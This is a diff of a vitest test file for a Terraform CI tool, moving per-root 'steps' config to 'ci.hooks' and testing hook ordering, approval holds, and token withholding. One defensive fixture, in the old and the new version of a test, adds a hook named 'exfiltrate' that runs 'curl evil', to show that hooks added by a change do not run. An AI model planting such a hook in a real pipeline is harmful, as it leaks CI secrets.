@@ -1,17 +1,22 @@
 import { chmodSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { afterEach, describe, expect, it, vi } from "vitest";
+import type { OpWaveHooks } from "@intentius/chant/op";
 import { applyWave, parseLedger } from "../src/apply";
-import { ConfigError, validateConfig } from "../src/config";
+import { ConfigError, STEPS_MOVED, validateConfig } from "../src/config";
 import { init as initRepo } from "../src/init";
+import { hookName, hookProblems, hooksAt, readHooks, runHooks, runUnitHooks } from "../src/hooks";
 import { renderNote } from "../src/report/views";
 import { runStage } from "../src/report/stage";
-import { readSteps, runSteps, runUnitSteps, stepName, stepsAt, STEPS_AFTER_INIT_TERRAGRUNT, terragruntStepsRefusal } from "../src/steps";
 import { git, tmp, write } from "./helpers";
 
 // Hours from the start of the run: chant stamps the pending facts it records with the time it runs, so an approval at T(h) is newer than any of them.
 const T0 = Date.now();
 const T = (h: number): string => new Date(T0 + h * 3600_000).toISOString();
+
+/** chant.workspace.json with these ci.hooks. */
+const decl = (hooks?: OpWaveHooks): string => `${JSON.stringify({ name: "t", schema: 1, minReader: "0.102.0", members: [], ...(hooks ? { ci: { hooks } } : {}) }, null, 2)}\n`;
+const sh = (run: string): string[] => ["sh", "-c", run];
 
 const problems = (raw: unknown): string[] => {
   try {
@@ -22,66 +27,58 @@ const problems = (raw: unknown): string[] => {
   }
 };
 
-describe("steps in terragucci.yml", () => {
-  it("takes a list of steps, each with run and one of before or after", () => {
-    expect(problems({ steps: [{ run: "./check.sh", before: "plan" }, { name: "verify", run: "cosign verify", after: "init", roots: ["prod/*"], on_failure: "approve" }] })).toEqual([]);
+describe("ci.hooks in chant.workspace.json", () => {
+  it("terragucci.yml takes no steps, and says where they went", () => {
+    expect(problems({ steps: [{ run: "./check.sh", before: "plan" }] })).toEqual([`config.steps: ${STEPS_MOVED}`]);
     expect(problems({ image: "registry.example.com/infra/tg:1" })).toEqual([]);
   });
 
-  it("refuses a step with no command, no stage or both, an unknown key, and an approve step after the gate", () => {
-    const found = problems({ steps: [{ before: "plan" }, { run: "x" }, { run: "x", before: "plan", after: "plan" }, { run: "x", before: "deploy" }, { run: "x", before: "plan", when: "always" }, { run: "x", before: "apply", on_failure: "approve" }, { run: "x", after: "drift", on_failure: "approve" }] });
-    expect(found.join("\n")).toContain("steps[0].run must be the command the step runs");
-    expect(found.join("\n")).toContain("steps[1] needs one of before or after");
-    expect(found.join("\n")).toContain("steps[2] needs one of before or after");
-    expect(found.join("\n")).toContain('steps[3].before is "deploy"');
-    expect(found.join("\n")).toContain("steps[4].when is not a setting");
-    expect(found.join("\n")).toContain("steps[5].on_failure: approve holds the wave at its gate");
-    expect(found.join("\n")).toContain("steps[6].on_failure: approve holds the wave at its gate");
-    expect(problems({ steps: "x" }).join("\n")).toContain("steps must be a list of steps, each with run and before or after");
-    expect(problems({ image: "two words" }).join("\n")).toContain("image must be an image reference");
+  it("refuses a hook without perRun: terragucci runs each hook for each root", () => {
+    expect(hookProblems({ "before-plan": [{ name: "lint", command: ["./lint"] }, { command: ["./ok"], perRun: true }] })).toEqual([
+      "ci.hooks before-plan lint: terragucci runs a hook for each root it matches, in that root's directory, so set perRun: true",
+    ]);
   });
 
-  it("selects a moment's steps by root glob, in the config's order, and names a step by its command when it has no name", () => {
-    const steps = [
-      { run: "a", before: "plan" as const, roots: ["prod/*"] },
-      { run: "b", before: "plan" as const },
-      { run: "c", after: "plan" as const },
-    ];
-    expect(stepsAt(steps, "before-plan", "prod/app").map((s) => s.run)).toEqual(["a", "b"]);
-    expect(stepsAt(steps, "before-plan", "dev/app").map((s) => s.run)).toEqual(["b"]);
-    expect(stepsAt(steps, "after-plan", "dev/app").map((s) => s.run)).toEqual(["c"]);
-    expect(stepName({ run: "echo hi\necho there", before: "plan" })).toBe("echo hi");
-    expect(stepName({ name: "verify", run: "x", before: "plan" })).toBe("verify");
+  it("selects a moment's hooks by target, in the declaration's order, and names a hook by its command when it has no name", () => {
+    const hooks = { "before-plan": [{ command: ["a"], perRun: true, targets: ["prod/*"] }, { command: ["b"], perRun: true }], "after-plan": [{ command: ["c"], perRun: true }] };
+    expect(hooksAt(hooks, "before-plan", "prod/app").map((h) => h.command[0])).toEqual(["a", "b"]);
+    expect(hooksAt(hooks, "before-plan", "dev/app").map((h) => h.command[0])).toEqual(["b"]);
+    expect(hooksAt(hooks, "after-plan", "dev/app").map((h) => h.command[0])).toEqual(["c"]);
+    expect(hookName({ command: ["echo", "hi"] })).toBe("echo hi");
+    expect(hookName({ name: "verify", command: ["x"] })).toBe("verify");
   });
 });
 
-describe("runSteps", () => {
-  it("runs a step in the root's directory with the stage's variables and no forge token", async () => {
+describe("runHooks", () => {
+  it("runs a hook in the root's directory with the stage's variables and no forge token", async () => {
     const repo = write(tmp(), { "app/main.tf": "" });
     const lines: string[] = [];
     const env = { PATH: process.env.PATH, TG_TOKEN: "tok-1", GITHUB_TOKEN: "gh-1", FOO: "bar" };
-    const out = await runSteps([{ run: 'pwd > seen; env | sort >> seen; echo hello', before: "plan" }], "before-plan", { repo, root: "app", stage: "tf-plan", env, planFile: "/tmp/p", log: (l) => lines.push(l) });
-    expect(out).toEqual({ runs: [expect.objectContaining({ name: expect.any(String), when: "before-plan", status: "passed", exit: 0 })], holds: [] });
+    const hooks = { "after-plan": [{ name: "see", command: sh("pwd > seen; env | sort >> seen; echo hello {target}"), perRun: true }] };
+    const out = await runHooks(hooks, "after-plan", { repo, root: "app", stage: "tf-plan", env, planFile: "/tmp/p", log: (l) => lines.push(l) });
+    expect(out).toEqual({ runs: [expect.objectContaining({ name: "see", when: "after-plan", status: "passed", exit: 0 })], holds: [] });
     const seen = readFileSync(join(repo, "app", "seen"), "utf-8");
     expect(seen.split("\n")[0]).toMatch(/\/app$/);
     expect(seen).toMatch(/^TG_STAGE=tf-plan$/m);
-    expect(seen).toMatch(/^TG_STEP=before-plan$/m);
+    expect(seen).toMatch(/^CHANT_HOOK=after-plan$/m);
+    expect(seen).toMatch(/^CHANT_TARGET=app$/m);
     expect(seen).toMatch(/^TG_ROOT=app$/m);
     expect(seen).toMatch(/^TG_PLAN_FILE=\/tmp\/p$/m);
+    expect(seen).toMatch(/^CHANT_PLAN=\/tmp\/p$/m);
     expect(seen).toMatch(/^FOO=bar$/m);
     expect(seen).not.toContain("tok-1");
     expect(seen).not.toContain("gh-1");
-    expect(lines).toContain("app: before-plan pwd > seen; env | sort >> seen; echo hello: hello");
+    expect(lines).toContain("app: after-plan see: hello app");
   });
 
-  it("a failed step fails the root and stops the steps after it; an approve step holds the wave and the rest still run", async () => {
+  it("a failed hook fails the root and stops the hooks after it; an approve hook holds the wave and the rest still run", async () => {
     const repo = write(tmp(), { "app/main.tf": "" });
     const ctx = { repo, root: "app", stage: "tf-apply" as const, env: { PATH: process.env.PATH }, log: () => {} };
-    const failed = await runSteps([{ run: "echo bad >&2; exit 7", before: "plan" }, { run: "touch never", before: "plan" }], "before-plan", ctx);
-    expect(failed.error).toBe("step before-plan echo bad >&2; exit 7 failed with exit 7:\nbad");
+    const failed = await runHooks({ "before-plan": [{ name: "bad", command: sh("echo bad >&2; exit 7"), perRun: true }, { command: sh("touch never"), perRun: true }] }, "before-plan", ctx);
+    expect(failed.error).toBe("hook before-plan bad failed with exit 7:\nbad");
     expect(failed.runs.map((r) => r.status)).toEqual(["failed"]);
     expect(existsSync(join(repo, "app", "never"))).toBe(false);
-    const held = await runSteps([{ name: "verify", run: "exit 1", before: "plan", on_failure: "approve" }, { run: "touch after", before: "plan" }], "before-plan", ctx);
+    const held = await runHooks({ "before-plan": [{ name: "verify", command: sh("exit 1"), perRun: true, onFailure: "approve" }, { command: sh("touch after"), perRun: true }] }, "before-plan", ctx);
     expect(held.error).toBeUndefined();
     expect(held.holds).toEqual(["verify"]);
     expect(held.runs.map((r) => r.status)).toEqual(["approval", "passed"]);
@@ -104,25 +101,24 @@ function branched(base: Record<string, string>, head: Record<string, string>): {
   return { repo, baseSha };
 }
 
-describe("steps are read at base", () => {
-  it("a change that adds, edits or removes a step runs the base's steps, not its own", async () => {
-    const { repo, baseSha } = branched(
-      { "terragucci.yml": "steps:\n  - name: verify\n    run: ./verify.sh\n    before: plan\n" },
-      { "terragucci.yml": "steps:\n  - name: exfiltrate\n    run: curl evil\n    before: apply\n" },
-    );
-    const read = await readSteps(repo, baseSha, [{ name: "exfiltrate", run: "curl evil", before: "apply" }]);
-    expect(read.steps).toEqual([{ name: "verify", run: "./verify.sh", before: "plan" }]);
+describe("ci.hooks are read at base", () => {
+  it("a change that adds, edits or removes a hook runs the base's hooks, not its own", () => {
+    const verify = { name: "verify", command: ["./verify.sh"], perRun: true };
+    const { repo, baseSha } = branched({ "chant.workspace.json": decl({ before: { plan: [verify] } }) }, { "chant.workspace.json": decl({ before: { apply: [{ name: "exfiltrate", command: ["curl", "evil"], perRun: true }] } }) });
+    const read = readHooks(repo, baseSha);
+    expect(read.hooks).toEqual({ "before-plan": [verify] });
     expect(read.from).toBe(baseSha);
     // No base (a drift run on the default branch): the checkout's own.
-    expect((await readSteps(repo, undefined, [{ run: "x", before: "plan" }])).steps).toEqual([{ run: "x", before: "plan" }]);
+    expect(Object.keys(readHooks(repo, undefined).hooks)).toEqual(["before-apply"]);
   });
 
-  it("a base it cannot read runs no step when the checkout names none, and fails when it names some", async () => {
-    const { repo } = branched({ "terragucci.yml": "gate: never\n" }, {});
-    const none = await readSteps(repo, "origin/nowhere", undefined);
-    expect(none.steps).toEqual([]);
-    expect(none.note).toContain("this checkout names no steps, so none run");
-    await expect(readSteps(repo, "origin/nowhere", [{ run: "x", before: "plan" }])).rejects.toThrow(/steps are read from the config at origin\/nowhere/);
+  it("a base it cannot read runs no hook when the checkout names none, and fails when it names some", () => {
+    const { repo } = branched({ "chant.workspace.json": decl() }, {});
+    const none = readHooks(repo, "origin/nowhere");
+    expect(none.hooks).toEqual({});
+    expect(none.note).toContain("this checkout names no hooks, so none run");
+    write(repo, { "chant.workspace.json": decl({ before: { plan: [{ command: ["x"], perRun: true }] } }) });
+    expect(() => readHooks(repo, "origin/nowhere")).toThrow(/ci.hooks are read from chant.workspace.json at origin\/nowhere.*so no hook can be trusted to run/);
   });
 });
 
@@ -142,20 +138,20 @@ esac
   return path;
 }
 
-describe("tf-plan with steps", () => {
-  const STEPS = "steps:\n  - name: write\n    run: echo from-step > step.txt\n    before: plan\n";
+describe("tf-plan with ci.hooks", () => {
+  const HOOKS = decl({ before: { plan: [{ name: "write", command: sh("echo from-hook > step.txt"), perRun: true }] } });
 
-  it("a step before the plan writes a file the plan reads, and the report and the note list it", { timeout: 60_000 }, async () => {
-    const { repo } = branched({ "terragucci.yml": STEPS, "app/main.tf": 'terraform {\n  backend "local" {}\n}\n' }, { "app/extra.tf": "# change\n" });
+  it("a hook before the plan writes a file the plan reads, and the report and the note list it", { timeout: 60_000 }, async () => {
+    const { repo } = branched({ "chant.workspace.json": HOOKS, "app/main.tf": 'terraform {\n  backend "local" {}\n}\n' }, { "app/extra.tf": "# change\n" });
     const bin = tmp();
     const result = await runStage("tf-plan", repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out") }, () => {});
     expect(result.failed).toBe(false);
     expect(result.report.roots[0].steps).toEqual([expect.objectContaining({ name: "write", when: "before-plan", status: "passed", exit: 0 })]);
-    expect(renderNote(result.report)).toMatch(/\*\*Steps \(1\):\*\*[\s\S]*\| .*app.* \| before-plan \| write \| passed \|/);
+    expect(renderNote(result.report)).toMatch(/\*\*Hooks \(1\):\*\*[\s\S]*\| .*app.* \| before-plan \| write \| passed \|/);
   });
 
-  it("a step the change adds does not run: the base has none, so the plan does without it", { timeout: 60_000 }, async () => {
-    const { repo } = branched({ "terragucci.yml": "gate: never\n", "app/main.tf": 'terraform {\n  backend "local" {}\n}\n' }, { "terragucci.yml": STEPS, "app/extra.tf": "# change\n" });
+  it("a hook the change adds does not run: the base has none, so the plan does without it", { timeout: 60_000 }, async () => {
+    const { repo } = branched({ "chant.workspace.json": decl(), "app/main.tf": 'terraform {\n  backend "local" {}\n}\n' }, { "chant.workspace.json": HOOKS, "app/extra.tf": "# change\n" });
     const bin = tmp();
     const result = await runStage("tf-plan", repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out") }, () => {});
     expect(result.failed).toBe(true);
@@ -163,22 +159,22 @@ describe("tf-plan with steps", () => {
     expect(result.report.roots[0].error).toContain("no step.txt");
   });
 
-  it("a failed step fails the root before its plan; an approve step marks its wave as waiting whatever the gate", { timeout: 60_000 }, async () => {
+  it("a failed hook fails the root before its init; an approve hook marks its wave as waiting whatever the gate", { timeout: 60_000 }, async () => {
     const files = { "app/main.tf": 'terraform {\n  backend "local" {}\n}\n', "app/step.txt": "x" };
     const bin = tmp();
-    const fail = branched({ ...files, "terragucci.yml": "steps:\n  - run: exit 3\n    before: init\n" }, { "app/extra.tf": "# change\n" });
+    const fail = branched({ ...files, "chant.workspace.json": decl({ before: { observe: [{ name: "stop", command: sh("exit 3"), perRun: true }] } }) }, { "app/extra.tf": "# change\n" });
     const r1 = await runStage("tf-plan", fail.repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out1") }, () => {});
     expect(r1.failed).toBe(true);
-    expect(r1.report.roots[0].error).toContain("step before-init exit 3 failed with exit 3");
+    expect(r1.report.roots[0].error).toContain("hook before-observe stop failed with exit 3");
     expect(existsSync(join(bin, "calls.log")) ? readFileSync(join(bin, "calls.log"), "utf-8") : "").not.toContain("init");
 
-    const hold = branched({ ...files, "terragucci.yml": "gate: never\nsteps:\n  - name: verify\n    run: exit 1\n    after: plan\n    on_failure: approve\n" }, { "app/extra.tf": "# change\n" });
+    const hold = branched({ ...files, "terragucci.yml": "gate: never\n", "chant.workspace.json": decl({ after: { plan: [{ name: "verify", command: sh("exit 1"), perRun: true, onFailure: "approve" }] } }) }, { "app/extra.tf": "# change\n" });
     const r2 = await runStage("tf-plan", hold.repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out2") }, () => {});
     expect(r2.failed).toBe(false);
     expect(r2.report.waves[0]).toMatchObject({ waits: true, held_by_steps: ["app"] });
-    expect(r2.report.roots[0].why).toContain("step verify asks for an approval");
+    expect(r2.report.roots[0].why).toContain("hook verify asks for an approval");
     expect(renderNote(r2.report)).toContain("asks for an approval, exit 1");
-    expect(renderNote(r2.report)).toMatch(/waits for an approval.*\(a step of `app` asks for one\)/);
+    expect(renderNote(r2.report)).toMatch(/waits for an approval.*\(a hook of `app` asks for one\)/);
   });
 });
 
@@ -193,7 +189,7 @@ esac
 exit 0
 `;
 
-describe("a wave with steps", () => {
+describe("a wave with ci.hooks", () => {
   afterEach(() => {
     vi.restoreAllMocks();
     vi.unstubAllEnvs();
@@ -201,7 +197,7 @@ describe("a wave with steps", () => {
 
   /** A repo whose first commit holds `base` and whose second, the one applied, holds `head`. */
   function setup(base: Record<string, string>, head: Record<string, string> = {}): { work: string; origin: string; bin: string; log: string } {
-    const dir = tmp("tg-steps-wave-");
+    const dir = tmp("tg-hooks-wave-");
     const origin = join(dir, "origin.git");
     git(dir, "init", "-q", "--bare", origin);
     const work = join(dir, "work");
@@ -226,34 +222,36 @@ describe("a wave with steps", () => {
     return { work, origin, bin, log: join(dir, "apply.log") };
   }
   const opts = (bin: string) => ({ wave: 1, layers: [["a"]], binary: bin, gate: "never" as const, env: { ...process.env } });
+  const echo = (moment: string) => [{ command: sh(`echo ${moment} >> "$TG_REPO/order"`), perRun: true }];
 
-  it("runs the steps around init, plan and apply, and a failed step stops the wave before anything applies", async () => {
-    const steps = "steps:\n" + ["before: init", "after: init", "before: plan", "after: plan", "before: apply", "after: apply"].map((w) => `  - run: echo ${w.replace(": ", "-")} >> "$TG_REPO/order"\n    ${w}\n`).join("");
-    const ok = setup({ "terragucci.yml": steps });
+  it("runs the hooks around init, plan and apply, and a failed hook stops the wave before anything applies", async () => {
+    const hooks = { before: { observe: echo("before-observe"), plan: echo("before-plan"), apply: echo("before-apply") }, after: { plan: echo("after-plan"), apply: echo("after-apply") } };
+    const ok = setup({ "chant.workspace.json": decl(hooks) });
     vi.spyOn(console, "log").mockImplementation(() => {});
     expect(await applyWave(ok.work, opts(ok.bin))).toBe(0);
-    expect(readFileSync(join(ok.work, "order"), "utf-8").trim().split("\n")).toEqual(["before-init", "after-init", "before-plan", "after-plan", "before-apply", "after-apply"]);
+    const order = ["before-observe", "before-plan", "after-plan", "before-apply", "after-apply"];
+    expect(readFileSync(join(ok.work, "order"), "utf-8").trim().split("\n")).toEqual(order);
     const report = JSON.parse(readFileSync(join(ok.work, "terragucci-report", "report.json"), "utf-8"));
-    expect(report.roots[0].steps.map((s: { when: string }) => s.when)).toEqual(["before-init", "after-init", "before-plan", "after-plan", "before-apply", "after-apply"]);
+    expect(report.roots[0].steps.map((s: { when: string }) => s.when)).toEqual(order);
 
-    const bad = setup({ "terragucci.yml": "steps:\n  - run: exit 1\n    after: plan\n" });
+    const bad = setup({ "chant.workspace.json": decl({ after: { plan: [{ command: sh("exit 1"), perRun: true }] } }) });
     expect(await applyWave(bad.work, opts(bad.bin))).toBe(1);
     expect(existsSync(bad.log)).toBe(false);
   });
 
-  it("reads the steps at the applied commit's first parent: a step the applied commit adds does not run", async () => {
-    const { work, bin, log } = setup({ "terragucci.yml": "gate: never\n" }, { "terragucci.yml": "steps:\n  - run: exit 1\n    before: apply\n" });
+  it("reads the hooks at the applied commit's first parent: a hook the applied commit adds does not run", async () => {
+    const { work, bin, log } = setup({ "chant.workspace.json": decl() }, { "chant.workspace.json": decl({ before: { apply: [{ command: sh("exit 1"), perRun: true }] } }) });
     vi.spyOn(console, "log").mockImplementation(() => {});
     expect(await applyWave(work, opts(bin))).toBe(0);
     expect(readFileSync(log, "utf-8")).toContain("applied a");
   });
 
-  it("an approve step that fails holds the wave at its gate under gate: never, through the set digest's ledger", async () => {
-    const { work, origin, bin, log } = setup({ "terragucci.yml": "steps:\n  - name: verify\n    run: exit 1\n    before: plan\n    on_failure: approve\n" });
+  it("an approve hook that fails holds the wave at its gate under gate: never, through the set digest's ledger", async () => {
+    const { work, origin, bin, log } = setup({ "chant.workspace.json": decl({ before: { plan: [{ name: "verify", command: sh("exit 1"), perRun: true, onFailure: "approve" }] } }) });
     const out = vi.spyOn(console, "log").mockImplementation(() => {});
     expect(await applyWave(work, { ...opts(bin), now: T(1) })).toBe(3);
     expect(existsSync(log)).toBe(false);
-    expect(out.mock.calls.flat().join("\n")).toContain("a: step verify asks for an approval, so the gate holds this wave");
+    expect(out.mock.calls.flat().join("\n")).toContain("a: hook verify asks for an approval, so the gate holds this wave");
     const ledger = parseLedger(git(origin, "show", "chant/lifecycle:_gates/tf-apply.jsonl"));
     expect(ledger.pending).toHaveLength(1);
     const report = JSON.parse(readFileSync(join(work, "terragucci-report", "report.json"), "utf-8"));
@@ -271,35 +269,27 @@ describe("a wave with steps", () => {
   });
 });
 
-describe("init with steps and image", () => {
-  it("writes the image terragucci.yml names into every job; in a Terragrunt repo it takes steps and refuses only after: init", async () => {
+describe("init with image", () => {
+  it("writes the image terragucci.yml names into every job", async () => {
     const repo = write(tmp(), { "app/main.tf": 'terraform {\n  backend "local" {}\n}\n', "terragucci.yml": "forge: github\nimage: registry.example.com/infra/tg:1\n" });
     const r = await initRepo(repo, { dryRun: true });
     const wf = r.files.find((f) => f.path.endsWith("terragucci.yml") && f.path.includes(".github"))!.content;
     expect(wf).toContain("# Every job runs in registry.example.com/infra/tg:1, the image terragucci.yml names.");
     expect(wf).not.toContain("ghcr.io/intentius/terragucci-");
-    const tg = write(tmp(), { "root.hcl": "", "app/terragrunt.hcl": "", "terragucci.yml": "forge: github\nsteps:\n  - run: x\n    before: plan\n" });
-    await expect(initRepo(tg, { dryRun: true, terragrunt: "/nonexistent/terragrunt" })).resolves.toBeDefined();
-    const late = write(tmp(), { "root.hcl": "", "app/terragrunt.hcl": "", "terragucci.yml": "forge: github\nsteps:\n  - name: late\n    run: x\n    after: init\n" });
-    await expect(initRepo(late, { dryRun: true, terragrunt: "/nonexistent/terragrunt" })).rejects.toThrow(`steps late: ${STEPS_AFTER_INIT_TERRAGRUNT}`);
   });
 });
 
-describe("steps around a Terragrunt wave's run --all", () => {
-  it("refuses only after: init, naming the steps", () => {
-    expect(terragruntStepsRefusal(undefined)).toBeUndefined();
-    expect(terragruntStepsRefusal([{ run: "x", before: "init" }, { run: "y", after: "plan" }, { run: "z", before: "apply" }])).toBeUndefined();
-    expect(terragruntStepsRefusal([{ name: "a", run: "x", after: "init" }, { run: "echo b", after: "init" }])).toBe(`steps a, echo b: ${STEPS_AFTER_INIT_TERRAGRUNT}`);
-  });
-
-  it("runs a moment once per unit its globs match, in the unit's directory, with the unit's saved plan", async () => {
+describe("hooks around a Terragrunt wave's run --all", () => {
+  it("runs a moment once per unit its targets match, in the unit's directory, with the unit's saved plan", async () => {
     const repo = write(tmp(), { "live/a/terragrunt.hcl": "", "live/b/terragrunt.hcl": "", "other/c/terragrunt.hcl": "" });
     const lines: string[] = [];
-    const steps = [
-      { name: "where", run: 'echo "$TG_ROOT $(basename "$PWD") $TG_PLAN_FILE"', after: "plan" as const, roots: ["live/*"] },
-      { name: "held", run: "exit 2", after: "plan" as const, roots: ["live/b"], on_failure: "approve" as const },
-    ];
-    const out = await runUnitSteps(steps, "after-plan", ["live/a", "live/b", "other/c"], { repo, stage: "tf-apply", env: {}, log: (l) => lines.push(l), planFile: (u) => `/plans/${u}/tfplan.tfplan` });
+    const hooks = {
+      "after-plan": [
+        { name: "where", command: sh('echo "$TG_ROOT $(basename "$PWD") $TG_PLAN_FILE"'), perRun: true, targets: ["live/*"] },
+        { name: "held", command: sh("exit 2"), perRun: true, targets: ["live/b"], onFailure: "approve" as const },
+      ],
+    };
+    const out = await runUnitHooks(hooks, "after-plan", ["live/a", "live/b", "other/c"], { repo, stage: "tf-apply", env: { PATH: process.env.PATH }, log: (l) => lines.push(l), planFile: (u) => `/plans/${u}/tfplan.tfplan` });
     expect([...out.keys()]).toEqual(["live/a", "live/b"]);
     expect(lines).toContain("live/a: after-plan where: live/a a /plans/live/a/tfplan.tfplan");
     expect(lines).toContain("live/b: after-plan where: live/b b /plans/live/b/tfplan.tfplan");
